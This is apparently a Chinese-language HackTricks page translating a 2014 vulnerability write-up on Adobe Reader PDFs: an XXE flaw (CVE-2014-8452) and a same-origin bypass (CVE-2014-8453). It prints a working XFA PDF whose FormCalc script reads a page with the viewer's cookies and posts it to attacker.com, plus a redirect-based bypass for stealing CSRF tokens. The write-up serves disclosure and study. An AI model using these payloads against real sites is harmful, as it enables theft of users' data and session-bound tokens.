# PDF上传 - XXE和CORS绕过

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品 - [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

#### 内容来自[https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html](https://insert-script.blogspot.com/2014/12/multiple-pdf-vulnerabilites-text-and.html)

### Reader中的Javascript函数可用于从外部实体读取数据 (CVE-2014-8452)

状态: 已修复\
实际情况: 未修复\
\
这个漏洞是关于我发现的一个简单的XXE漏洞。\
我阅读了论文"Polyglots: Crossing Origins by Crossing Formats"，其中讨论了XMLData.parse中的一个漏洞。可以使用外部实体并引用它们。\
我阅读了规范，发现除了"parse"之外还有更多用于读取XML的函数。\
我创建了一个简单的XML文件，引用了同一域中的一个URL，并使用loadXML解析它。\
它起作用了：

![](https://4.bp.blogspot.com/-is4Q5hSZk-Y/VIwdzdAckWI/AAAAAAAAACI/OAzBs9Q-T50/s1600/xxe.png)
```
7 0 obj
<<
/Type /Action
/S /JavaScript
/JS (
var cXMLDoc = '<?xml version="1.0" encoding="ISO-8859-1"?><foo>muh</foo>'
var cXMLDoc2 = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ENTITY aaaa SYSTEM "http://example.com">]><ab>&aaaa;</ab>'
xml = XMLData.parse(cXMLDoc,false);
xml.loadXML(cXMLDoc2,false,true);
)
>>
endobj
```
\
影响有限，因为：
o）仅限于同源
o）HTML页面会破坏XML
o）不支持动态实体
o）我曾经想过使用utf-16的XML来避免破坏XML结构，但是没有成功。

但是它仍然可以用来读取JSON。

### Reader中的同源策略绕过（CVE-2014-8453）

状态：已修复
实际情况：已修复，但同源仍然存在漏洞！

在我看来，这是最强大的漏洞。即使没有同源绕过，它也展示了PDF的强大和可怕之处。
很多人知道PDF支持一种名为Javascript的脚本语言，但还有另一种。
在Adobe Reader支持的文件类型XFA的规范中提到了它。
它被称为formcalc，它的功能不是很强大。它用于简单的数学计算。但在Adobe的规范中，
还有三个额外的函数：'GET'，'POST'和'PUT'。是的，它们的名字说明了一切。
'GET'有一个参数：一个URL。它将使用浏览器（是的，包括Cookies）来检索URL并返回其内容。
然后，我们可以使用'POST'将返回的内容发送到我们自己的服务器：

var content = GET("myfriends.php");
Post("http://attacker.com",content);

这些函数是同源的，所以一个网站需要允许我们上传PDF。对于大多数网站来说，这并不是那么不切实际。
attacker.com不是同源的，所以你需要设置一个crossdomain.xml，就像Adobe产品一样。

总结一下：这不是一个bug，这是一个功能。一旦你被允许在网站上上传PDF，
你就可以在查看PDF的用户的上下文中访问该网站。因为请求是由浏览器发出的，所以Cookies也会被发送。你还可以使用它来突破任何通过读取令牌来保护的CSRF保护机制。
```
% a PDF file using an XFA
% most whitespace can be removed (truncated to 570 bytes or so...)
% Ange Albertini BSD Licence 2012

% modified by insertscript

%PDF-1. % can be truncated to %PDF-\0

1 0 obj <<>>
stream
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
<config><present><pdf>
<interactive>1</interactive>
</pdf></present></config>
<template>
<subform name="_">
<pageSet/>
<field id="Hello World!">
<event activity="initialize">
<script contentType='application/x-formcalc'>
var content = GET("myfriends.php");
Post("http://attacker.com",content);
</script>
</event>
</field>
</subform>
</template>
</xdp:xdp>
endstream
endobj

trailer <<
/Root <<
/AcroForm <<
/Fields [<<
/T (0)
/Kids [<<
/Subtype /Widget
/Rect []
/T ()
/FT /Btn
>>]
>>]
/XFA 1 0 R
>>
/Pages <<>>
>>
>>
```
在找到这些功能之后，我发现了一个同源策略绕过方法。这使得可以将受害者的浏览器用作代理（@beef仍在开发模块^^）。

绕过方法非常简单：

1. 用户A从http://attacker.com/evil.pdf加载evil.pdf。
2. Evil.pdf使用formcalc GET来读取http://attacker.com/redirect.php。
3. redirect.php使用301重定向到http://facebook.com。
4. Adobe Reader会跟随重定向并读取响应，而不会查找crossdomain.xml。
5. evil.pdf通过POST将检索到的内容发送到http://attacker.com/log.php。

请注意，使用此技术可以窃取页面的CSRF令牌并滥用CSRF漏洞。

这个简单的绕过方法现在已经修复了。我希望他们也能实现对同源请求的对话框警告。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**为你的公司做广告**吗？或者你想要**获取最新版本的PEASS或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>
